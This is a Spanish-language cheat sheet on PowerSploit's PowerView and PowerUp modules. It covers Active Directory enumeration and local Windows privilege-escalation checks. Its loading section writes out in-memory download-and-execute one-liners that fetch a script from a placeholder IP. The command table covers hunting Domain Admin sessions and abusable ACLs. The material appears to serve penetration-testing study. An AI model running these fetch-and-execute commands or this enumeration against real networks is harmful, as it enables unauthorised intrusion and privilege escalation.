---
title: PowerSploit (PowerView / PowerUp)
resumen: Módulos de PowerShell para enumerar AD desde dentro (PowerView) y buscar escalada local en Windows (PowerUp).
tags: swiss-army-knife
---

> Repositorio: [PowerSploit/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### Carga de los módulos

```powershell
Import-Module <Nombre_Modulo.ps1>

# Dot sourcing: ejecuta el script en el contexto actual
. .\<Nombre_Script>.ps1

# Download & Execute en memoria, sin tocar disco
iex (iwr 'http://IP/file.ps1')
iex (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')
```

## PowerView — enumeración de AD

| Comando | Descripción |
|---|---|
| `Get-NetDomain` | Información del dominio actual: nombre, SID, DCs... |
| `Get-NetDomain -Domain cyberwarfare.corp` | Información de un dominio específico por FQDN |
| `Get-NetDomainController -Domain cyberwarfare.corp` | Enumera los Domain Controllers |
| `Get-DomainSID` | SID del dominio actual (necesario para Golden/Silver Ticket) |
| `Get-NetUser` / `Get-NetUser -UserName emp1` | Lista/filtra usuarios del dominio con atributos LDAP |
| `Get-NetComputer -FullData` | Enumera equipos del dominio con todos sus atributos |
| `Get-NetComputer -OperatingSystem "Windows Server 2016 Standard"` | Filtra equipos por sistema operativo |
| `Get-NetGroup -FullData` | Lista todos los grupos del dominio |
| `Get-NetGroupMember -GroupName "Domain Admins" -Verbose` | Miembros de un grupo privilegiado |
| `Get-NetLocalGroup -ComputerName DC-01 -ListGroups` | Grupos locales de un equipo remoto |
| `Get-ObjectAcl -SamAccountName <User> -ResolveGUIDs` | ACLs de un objeto (detecta permisos abusables) |
| `Invoke-ACLScanner -ResolveGUIDs` | Escaneo automático de ACLs interesantes en todo el dominio |
| `Get-NetDomainTrust -Domain cyberwarfare.corp` | Relaciones de confianza del dominio |
| `Get-NetForestDomain -Verbose` | Todos los dominios del bosque |
| `Get-NetForest -Verbose` | Información del bosque: dominios, Global Catalog... |
| `Find-LocalAdminAccess -Verbose` | Equipos donde el usuario actual tiene admin local |
| `Invoke-UserHunter` | Máquinas donde hay sesiones activas de Domain Admins |

## PowerUp — escalada de privilegios local en Windows

```powershell
. .\PowerUp.ps1
Invoke-AllChecks -Verbose        # Todos los checks de escalada de una vez
Get-ModifiableService -Verbose   # Servicios cuya configuración se puede modificar
Get-ServiceUnquoted -Verbose     # Rutas de servicio sin comillas (Unquoted Service Path)
```

### Técnicas donde aparece

[[abuse-acl]]
